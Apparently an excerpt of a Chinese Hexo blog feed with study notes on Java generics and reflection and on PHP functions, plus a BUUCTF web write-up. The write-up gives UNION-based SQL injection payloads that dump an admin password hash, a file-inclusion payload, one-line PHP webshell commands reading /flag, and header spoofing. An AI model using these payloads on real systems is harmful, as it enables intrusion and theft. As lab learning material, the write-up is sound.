ArrayList&lt;E&gt;</p><p>………</p><p>&lt;E&gt;的 E 为泛型，随意表示</p></li><li><p>带一个或多个类型参数的类或接口</p></li></ul><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><ul><li>interface List&lt;T&gt;{ }</li><li>class HashMap&lt;K,V&gt;{ }</li><li>T、K、V 代表表示类型</li></ul><h2 id="泛型实例化"><a href="#泛型实例化" class="headerlink" title="泛型实例化"></a>泛型实例化</h2><ul><li>HashMap&lt;String，String&gt;   hashMap &#x3D; new HashMap&lt;&gt;( )；</li><li>Iterator&lt;Map.Entry&lt;String,String&gt;&gt;  iterator &#x3D; entries.iterator( )；</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">HashMap hashMap=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();等价于 HashMap&lt;Object&gt; hashMap=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br></code></pre></td></tr></table></figure><h3 id="自定义泛型类"><a href="#自定义泛型类" class="headerlink" title="自定义泛型类"></a>自定义泛型类</h3><ul><li>不指定类型默认为 Object</li></ul><h3 id="自定义泛型接口"><a href="#自定义泛型接口" class="headerlink" title="自定义泛型接口"></a>自定义泛型接口</h3><ul><li>接口中静态成员不能使用泛型</li><li>类型在继承接口或类实现接口时确定</li></ul><h3 id="自定义泛型方法"><a href="#自定义泛型方法" class="headerlink" title="自定义泛型方法"></a>自定义泛型方法</h3><ul><li><p>带类型参数的方法</p></li><li><p>泛型方法可以定义在泛型和普通类里面。使用泛型的方法未定义泛型</p></li><li><p>可以使用自己声明的泛型，也可以使用类声明的泛型</p></li><li><p>在调用时会确定类型</p></li></ul><h3 id="泛型通配符-“-？”"><a href="#泛型通配符-“-？”" class="headerlink" title="泛型通配符 “ ？”"></a>泛型通配符 “ ？”</h3><ul><li><p>泛型没有继承</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;Object&gt; list=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;String&gt;();<br></code></pre></td></tr></table></figure></li><li><p><code>&lt;?&gt;</code> : 支持任意泛型类型，任何类型的 List 对象</p></li><li><p><code>&lt;? extends A&gt;</code> : 接受 A 或 A 的子类，规定上限</p></li><li><p><code>&lt;? super A&gt; </code>: A 类或 A 的父类，规定下限</p></li></ul><h1 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h1><ul><li>在不修改源码时，控制程序，不知道类结构情况下获取类的结构信息</li><li>可以突破访问修饰符的限制</li></ul><h2 id="Class-类的方法"><a href="#Class-类的方法" class="headerlink" title="Class 类的方法"></a>Class 类的方法</h2><table><thead><tr><th>方法名</th><th>作用描述</th></tr></thead><tbody><tr><td>getName</td><td>获取全类名</td></tr><tr><td>getSimpleName</td><td>获取简单类名</td></tr><tr><td>getSuperClass</td><td>以 Class 形式返回父类信息</td></tr><tr><td>getInterface</td><td>以 Class [ ] 形式返回接口信息</td></tr><tr><td>getFiled &#x2F; getFields</td><td>获取 public 修饰的字段，包含本类和父类</td></tr><tr><td>getDeclaredFiled &#x2F; getDeclaredFileds</td><td>获取本类所有字段</td></tr><tr><td>getMethod &#x2F; getMethods</td><td>获取 public 修饰的方法，包含本类和父类</td></tr><tr><td>getDeclaredMethod &#x2F; getDeclaredMethods</td><td>获取本类所有方法（包括私有）</td></tr><tr><td>getConstructors</td><td>获取本类 public 修饰的构造器</td></tr><tr><td>getDeclearedConstructors</td><td>获取本类所有构造器</td></tr><tr><td>getPackage</td><td>以 Package 形式返回包信息</td></tr><tr><td>getAnnotations</td><td>以 Annotation 形式返回注解信息</td></tr><tr><td>getClass</td><td>得到运行类型</td></tr><tr><td>newInstance</td><td>创建对象</td></tr><tr><td>getClassLoader</td><td>得到类加载器</td></tr><tr><td>forName</td><td>得到类对象</td></tr></tbody></table><h2 id="Class-类对象获取方式"><a href="#Class-类对象获取方式" class="headerlink" title="Class 类对象获取方式"></a>Class 类对象获取方式</h2><ul><li>Class.forName ( … )</li><li>类.class用于参数传递</li><li>对象.getClass ( )</li><li>ClassLoader.loadClass ( … )</li><li>基本数据类型的 Class 类对象获取   int.class    Integer.TYPE</li><li>基本数据类型的 Class 类对象获取    Integer.class</li></ul><h2 id="Class-类对象"><a href="#Class-类对象" class="headerlink" title="Class 类对象"></a>Class 类对象</h2><ul><li>外部类</li><li>成员内部类，静态内部类，局部内部类，匿名内部类</li><li>interface：接口</li><li>数组</li><li>enum：枚举     Thread.State</li><li>annotation：注解</li><li>基本数据类型</li><li>void</li></ul><h2 id="Class-类的方法-1"><a href="#Class-类的方法-1" class="headerlink" title="Class 类的方法"></a>Class 类的方法</h2><p>反射创造对象</p><ul><li>无参构造器</li><li>有参构造器</li><li>私有构造器</li></ul><p>反射操作属性</p><ul><li>获取属性</li><li>设置属性</li><li>私有属性</li><li>如果是静态属性，第一个参数可以给 null</li></ul><p>反射操作方法</p><ul><li>获取方法<ul><li>getMethod</li></ul></li></ul><h2 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h2><p>java . lang . reflect .Filed 类</p><ul><li>getModifiers ：以 int 形式返回修饰符</li><li>getType：以 Class 形式返回类型</li><li>getName：返回属性名</li></ul><p>java . lang . reflect . Method 类</p><ul><li>getModifiers ：以 int 形式返回修饰符</li><li>getReturnType：以 Class 形式获取返回类型</li><li>getName：返回方法名</li><li>getParameterTypes：以 Class [ ] 返回参数类型数组</li></ul><p>java . lang . reflect . Constructor 类</p><ul><li>getModifiers ：以 int 形式返回修饰符</li><li>getName：返回构造器名（全类名）</li><li>getParameterTypes：以 Class [ ] 返回参数类型数组</li><li>newInstance</li></ul><p>差不多就到这了，笔记比较简洁，里面有很多比较简单的东西没写，可能因为篇幅太长了，传上来的时候老是出现奇奇怪怪的问题，大半夜的差点给我干破防 qwq，搞了好半天才弄好呜呜呜呜呜……</p><p><img src="/2024/11/06/TestWP/q.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>Java 基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP 基础(部分)</title>
    <link href="/2024/11/08/PHP%E5%9F%BA%E7%A1%80-%E9%83%A8%E5%88%86/"/>
    <url>/2024/11/08/PHP%E5%9F%BA%E7%A1%80-%E9%83%A8%E5%88%86/</url>
    
    <content type="html"><![CDATA[<p>关于 PHP 的一小部分知识</p><span id="more"></span><h1 id="魔术常量"><a href="#魔术常量" class="headerlink" title="魔术常量"></a>魔术常量</h1><p>如 <code>__FILE__</code> 这样的预定义常量，被称为魔术常量。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">__FILE__</span><span class="hljs-comment">// 返回文件完整的路径和文件名</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-comment">//代码高亮显示当前文件内容</span><br><span class="hljs-keyword">__LINE__</span><span class="hljs-comment">// 表示当前行号</span><br><span class="hljs-keyword">__FILE__</span><span class="hljs-comment">// 表示当前文件名</span><br><span class="hljs-keyword">__DIR__</span><span class="hljs-comment">// 表示当前文件所在的目录</span><br><span class="hljs-keyword">__FUNCTION__</span><span class="hljs-comment">// 表示当前函数名</span><br><span class="hljs-keyword">__CLASS__</span><span class="hljs-comment">// 表示当前类名</span><br><span class="hljs-keyword">__METHOD__</span><span class="hljs-comment">// 表示当前方法名</span><br><span class="hljs-keyword">__NAMESPACE__</span><span class="hljs-comment">// 表示当前命名空间</span><br></code></pre></td></tr></table></figure><h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><h2 id="文件操作函数"><a href="#文件操作函数" class="headerlink" title="文件操作函数"></a>文件操作函数</h2><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">include</span>(): 包含并运行指定文件，包含文件发生错误，程序警告，但会继续执行<br><span class="hljs-built_in">include_once</span>(): 检查这个文件是否已经被导入，如果已导入，下文便不会再导入，直面 once 理解就是只导入一次<br><span class="hljs-built_in">require</span>(): 包含并运行指定的文件，包含文件发生错误时，程序直接终止执行<br><span class="hljs-built_in">require_once</span>():和 require 类似，不同处在于 require_once 只导入一次<br><span class="hljs-built_in">fopen</span>(): 打开一个文件或 URL<br><span class="hljs-built_in">file_get_contents</span>(): 读取文件的全部内容到一个字符串，例如 <span class="hljs-variable">$content</span> = <span class="hljs-built_in">file_get_contents</span>(<span class="hljs-string">&quot;test.txt&quot;</span>);<br><span class="hljs-built_in">file_put_contents</span>(): 将一个字符串写入文件。例如：<span class="hljs-built_in">file_put_contents</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;Hello butt3rf1y!&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="代码执行函数"><a href="#代码执行函数" class="headerlink" title="代码执行函数"></a>代码执行函数</h2><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">eval</span>(): 将字符串当中php代码来执行，比如: 一句话木马@<span class="hljs-built_in">eval</span>(_POST[<span class="hljs-string">&quot;1&quot;</span>]);<br><span class="hljs-built_in">assert</span>(): 检测执行条件是否为 true<br></code></pre></td></tr></table></figure><p>调用系统底层的4个方法-system , shell_exec , exec , passthru</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">system</span>(): 调用系统底层，执行系统命令，例如 <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;ls /&quot;</span>); 列出当前目录下所有文件<br><span class="hljs-built_in">shell_exc</span>(): 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回<br><span class="hljs-built_in">exec</span>():执行一个外部程序<br><span class="hljs-built_in">passthru</span>():执行外部程序并且显示原始输出，当所执行的 Unix<br>命令输出二进制数据， 并且需要直接传送到浏览器的时候， 需要用此函数来替代 <span class="hljs-built_in">exec</span>() 或 <span class="hljs-built_in">system</span>() 函数<br></code></pre></td></tr></table></figure><h2 id="反序列化函数"><a href="#反序列化函数" class="headerlink" title="反序列化函数"></a>反序列化函数</h2><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">unserialize</span>(): 将一个已序列化的字符串转换回 PHP 的值。例如：<span class="hljs-variable">$array</span> = <span class="hljs-built_in">unserialize</span>(<span class="hljs-variable">$serializedStr</span>); 可以将一个序列化的数组字符串转换为数组。<br></code></pre></td></tr></table></figure><h2 id="数据库操作函数"><a href="#数据库操作函数" class="headerlink" title="数据库操作函数"></a>数据库操作函数</h2><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">mysql_query</span>(), <span class="hljs-built_in">mysqli_query</span>(): 发送一个 MySQL 查询。例如：<span class="hljs-variable">$result</span> = <span class="hljs-built_in">mysql_query</span>(<span class="hljs-string">&quot;SELECT * FROM users&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="正则表达式函数"><a href="#正则表达式函数" class="headerlink" title="正则表达式函数"></a>正则表达式函数</h2><p><strong>preg_match():</strong></p><p>用于进行正则表达式匹配，成功返回 1，否则返回 0。</p><p>注: <code>preg_match() </code>第一次匹配成功后就会停止匹配，如果要实现全部结果的匹配，即搜索到检索对象的结尾处，则需使用 <code>preg_match_all()</code> 函数。 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>   <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/php/i&quot;</span>, <span class="hljs-string">&quot;PHP is the web scripting language of choice.&quot;</span>, <span class="hljs-variable">$matches</span>))<br>   &#123;<br>      <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;A match was found:&quot;</span>. <span class="hljs-variable">$matches</span>[<span class="hljs-number">0</span>]; <br>   &#125; <br>   <span class="hljs-keyword">else</span><br>   &#123;<br>      <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;A match was not found.&quot;</span>; <br>   &#125; <br><span class="hljs-meta">?&gt;</span> <br><span class="hljs-comment">//A match was found: PHP </span><br></code></pre></td></tr></table></figure><p><strong>preg_match_all():</strong> </p><p>用于进行正则表达式全局匹配，成功返回整个模式匹配的次数（可能为零），如果出错返回 FALSE 。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>   <span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;&lt;pre&gt;学习php是一件快乐的事。&lt;/pre&gt;&lt;pre&gt;所有的 phper 需要共同努力！&lt;/pre&gt;&quot;</span>; <br>   <span class="hljs-variable">$kw</span> = <span class="hljs-string">&quot;php&quot;</span>; <span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-string">&#x27;/&lt;pre&gt;([sS]*?)&lt;/pre&gt;/&#x27;</span>,<span class="hljs-variable">$str</span>,<span class="hljs-variable">$mat</span>); <br>   <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$mat</span>[<span class="hljs-number">0</span>]);<span class="hljs-variable">$i</span>++)<br>   &#123;<br>      <span class="hljs-variable">$mat</span>[<span class="hljs-number">0</span>][<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$mat</span>[<span class="hljs-number">1</span>][<span class="hljs-variable">$i</span>]; <br>      <span class="hljs-variable">$mat</span>[<span class="hljs-number">0</span>][<span class="hljs-variable">$i</span>] = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$kw</span>, <span class="hljs-string">&#x27;&lt;span style=&quot;color:#ff0000&quot;&gt;&#x27;</span>.<span class="hljs-variable">$kw</span>.<span class="hljs-string">&#x27;&lt;/span&gt;&#x27;</span>, <span class="hljs-variable">$mat</span>[<span class="hljs-number">0</span>][<span class="hljs-variable">$i</span>]); <br>      <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$mat</span>[<span class="hljs-number">1</span>][<span class="hljs-variable">$i</span>], <span class="hljs-variable">$mat</span>[<span class="hljs-number">0</span>][<span class="hljs-variable">$i</span>], <span class="hljs-variable">$str</span>); <br>   &#125; <br>   <span class="hljs-keyword">echo</span> <span class="hljs-variable">$str</span>; <br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//将所有 &lt;pre&gt;&lt;/pre&gt; 标签内的关键字显示为红色</span><br></code></pre></td></tr></table></figure><p><strong>preg_match_all()</strong></p><p>用于进行正则表达式全局匹配，成功返回整个模式匹配的次数（可能为零），如果出错返回 FALSE 。</p><p><strong>preg_replace()</strong></p><p> 执行正则表达式搜索和替换</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;butt3rf1y&quot;</span>;<br><span class="hljs-variable">$pattern</span> = <span class="hljs-string">&#x27;/\d+/&#x27;</span>;<span class="hljs-comment">// \d+是匹配一个或多个数字</span><br><span class="hljs-variable">$replacement</span> = <span class="hljs-string">&#x27;R&#x27;</span>;<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$pattern</span>, <span class="hljs-variable">$replacement</span>, <span class="hljs-variable">$str</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>; <br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">// buttRrfRy</span><br></code></pre></td></tr></table></figure><p><strong>preg_split()</strong></p><p>将字符串依指定的规则切开。</p><h1 id="表单数据"><a href="#表单数据" class="headerlink" title="表单数据"></a>表单数据</h1><p><strong>$_GET</strong></p><p>接受 GET 请求传递的参数</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">example.com/index.php?<span class="hljs-attribute">bu</span>=butt3rf1y，你可以使用 <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;bu&#x27;</span>] 来获取相应的值<br></code></pre></td></tr></table></figure><p><strong>$_POST</strong></p><p>接受 POST 传参</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">example.com/index.php 进行 POST 传参，参数名为 bu 内容为 but3rf1y，可以使用 <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;bu&#x27;</span>] 来获取相应的值。<br></code></pre></td></tr></table></figure><p><strong>$_REQUEST</strong></p><p>接受 GET 和 POST 以及 Cookie 请求传递的参数</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">通过 <span class="hljs-built_in">GET</span> 请求 URL 传递了一个参数 example.com/index.php?<span class="hljs-attribute">key</span>=value_from_get，可以通过 <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;key&#x27;</span>] 获取这个值。<br>通过 POST 方法提交了一个表单，其中有一个名为 key 的字段且其值为 value_from_post，可以通过 <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;key&#x27;</span>] 获取这个值。<br>设置了一个名为 key 的 cookie，其值为 value_from_cookie,可以使用 <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;key&#x27;</span>] 来获取这个值。<br></code></pre></td></tr></table></figure><p>有点小累……</p>]]></content>
    
    
    <categories>
      
      <category>PHP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUU Basic(1)</title>
    <link href="/2024/11/07/BUUBasic-1/"/>
    <url>/2024/11/07/BUUBasic-1/</url>
    
    <content type="html"><![CDATA[<p>BUU 做的几道题</p><span id="more"></span><h2 id="BUU-LFI-COURSE-1"><a href="#BUU-LFI-COURSE-1" class="headerlink" title="BUU LFI COURSE 1"></a>BUU LFI COURSE 1</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><br>    <span class="hljs-keyword">include</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>&#125;<br></code></pre></td></tr></table></figure><p>构造 payload:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">file</span>=/flag<br></code></pre></td></tr></table></figure><h2 id="BUU-SQL-COURSE-1"><a href="#BUU-SQL-COURSE-1" class="headerlink" title="BUU SQL COURSE 1"></a>BUU SQL COURSE 1</h2><p><img src="/2024/11/06/TestWP/c-1/SQL1.png"></p><p>点击 <code>测试新闻1</code> ，f12 查看状态，发现注入点，访问请求网址</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1 <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=1 正常回显<br><span class="hljs-attribute">1</span>=2 报错，说明有注入点<br></code></pre></td></tr></table></figure><p>构造 payload</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">schema_name</span>) <span class="hljs-keyword">from</span> information_schema.schemata),<span class="hljs-number">2</span>#<br>得到数据库：information_schema,performance_schema,ctftraining,mysql,test,news<br><br>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;news&#x27;</span>),<span class="hljs-number">2</span>#<br>得到数据库 news 下的表：<span class="hljs-keyword">admin</span>,contents<br><br>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;ctftraining&#x27;</span>),<span class="hljs-number">2</span>#<br>得到数据库 ctftraining 下的表：FLAG_TABLE,news,users<br><br>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;admin&#x27;</span>),<span class="hljs-number">2</span>#<br>得到 <span class="hljs-keyword">admin</span> 表下的列名：id,username,<span class="hljs-keyword">password</span><br><br>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>),<span class="hljs-number">2</span>#<br>得到 users 表下的列名：<span class="hljs-keyword">USER</span>,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,<span class="hljs-keyword">password</span>,ip,<span class="hljs-type">time</span><br><br>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> group_concat(username,&quot; &quot;,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">admin</span>),<span class="hljs-number">2</span>#<br>得到 <span class="hljs-keyword">admin</span> 的数据：username=<span class="hljs-keyword">admin</span> <span class="hljs-keyword">password</span>=<span class="hljs-number">64</span>ebd6a0d676acff2c6bed36e716c9aa<br></code></pre></td></tr></table></figure><h2 id="BUU-UPLOAD-COURSE-1"><a href="#BUU-UPLOAD-COURSE-1" class="headerlink" title="BUU UPLOAD COURSE 1"></a>BUU UPLOAD COURSE 1</h2><p>文件上传，先上传一个一句话木马 11.php ，但是蚁剑连接不了，无论上传什么都会被解析成 <code>.jpg</code> 格式</p><p>后面才知道这有一个文件包含漏洞，文件上传和文件包含结合起来了。</p><p><code>http://4eb012d0-f5b1-4297-907d-54f47dfaddf1.node5.buuoj.cn:81/index.php?file=upload.php</code> 将 <code>upload.php</code> 换成上传的文件的路径，然后对其 post 传参 </p><p>payload：1 是一句话木马的连接密码</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">1</span>=system(<span class="hljs-string">&quot;ls /&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">1</span>=system(<span class="hljs-string">&quot;cat /flag&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="BUU-BURP-COURSE-1"><a href="#BUU-BURP-COURSE-1" class="headerlink" title="BUU BURP COURSE 1"></a>BUU BURP COURSE 1</h2><p>提示只能本地访问，所以bp 抓包进行 <code>X-Forwarded-For</code> 伪造</p><p>然后进行 post 传参</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">username</span>=admin&amp;password=wwoj2wio2jw93ey43eiuwdjnewkndjlwe<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>BUUCTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TestWP</title>
    <link href="/2024/11/06/TestWP/"/>
    <url>/2024/11/06/TestWP/</url>
    
    <content type="html"><![CDATA[<p>这是一篇测试文章</p><span id="more"></span><p><img src="/2024/11/06/TestWP/111.png"></p><h1 id="一剪梅·红藕香残玉簟秋"><a href="#一剪梅·红藕香残玉簟秋" class="headerlink" title="一剪梅·红藕香残玉簟秋"></a>一剪梅·红藕香残玉簟秋</h1><p>一剪梅·红藕香残玉簟秋</p><p>李清照</p><p>红藕香残玉簟秋。轻解罗裳，独上兰舟。云中谁寄锦书来？雁字回时，月满西楼。<br>花自飘零水自流。一种相思，两处闲愁。此情无计可消除，才下眉头，却上心头。</p><p>C&#x2F;C++</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello world&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>PHP</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><br>    <span class="hljs-keyword">include</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>&#125;<br></code></pre></td></tr></table></figure><p>Python</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-built_in">str</span>=<span class="hljs-string">&quot;e3nifIH9b_C@n@dH&quot;</span><br>flag=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(<span class="hljs-built_in">str</span>)):<br>    flag+=<span 